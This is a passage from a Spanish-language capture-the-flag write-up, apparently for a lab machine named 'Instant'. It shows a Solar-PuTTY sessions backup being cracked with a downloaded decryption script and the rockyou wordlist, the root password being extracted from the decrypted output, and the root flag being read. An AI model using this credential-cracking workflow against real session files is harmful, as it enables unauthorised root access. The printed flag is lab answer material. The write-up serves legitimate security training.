decrypt2.py                                               100%[===================================================================================================================================>]   2,76K  --.-KB/s    en 0s      

2025-01-20 08:43:32 (55,7 MB/s) - «decrypt2.py» guardado [2824/2824]

❯ ls -l decrypt2.py
.rw-rw-r-- kali kali 2.8 KB Thu Dec 19 18:44:15 2024  decrypt2.py
```

El siguiente objetivo será lograr obtener la contraseña del archivo para obtener los datos. Estos archivos de sesiones, vienen cifrados con contraseña para no sean legibles a simple vista. En el siguiente blog, nos explican la vulnerabilidad detalladamente.

Al ejecutar el script, verificamos que hemos logrado desencriptarlo y obtener un archivo `.bin`.

{% embed url="https://voidsec.com/solarputtydecrypt/" %}

```bash
❯ python3 decrypt2.py sessions-backup.dat /usr/share/wordlists/rockyou.txt
-----------------------------------------------------
SolarPutty's Sessions Decrypter (Python Version)
-----------------------------------------------------
File content (first 50 bytes): b'ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJw'
Trying password: estrellaal
Potential successful decryption with password: estrella
Decrypted content (first 200 bytes):
b'\xacuY\xff\x11\xfbD\xba\xb3\xe2\xc8\x80pB\xbe\xceU\xed;\x8f)\x10\xb5Ins":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b'

[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted_estrella.bin
Continue trying other passwords? (y/n): n
```

Al analizar el archivo `SolarPutty_sessions_decrypted_estrella.bin`, verificamos que en el contenido nos aparece las credenciales del usuario `root`.

```bash
❯ ls -l SolarPutty_sessions_decrypted_estrella.bin
.rw-rw-r-- kali kali 791 B Mon Jan 20 08:44:06 2025  SolarPutty_sessions_decrypted_estrella.bin

❯ cat SolarPutty_sessions_decrypted_estrella.bin -l java
�uY��D���ȀpB��U�;�)�Ins":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
```

Probaremos de autenticarnos con el usuario `root` y comprobamos del acceso correcto y de visualizar la flag de **root.txt**

```bash
shirohige@instant:~$ su root
Password: 
root@instant:/home/shirohige$ cat /root/root.txt 
aa5b8cf9ae79746ef13920ab4727a589
```
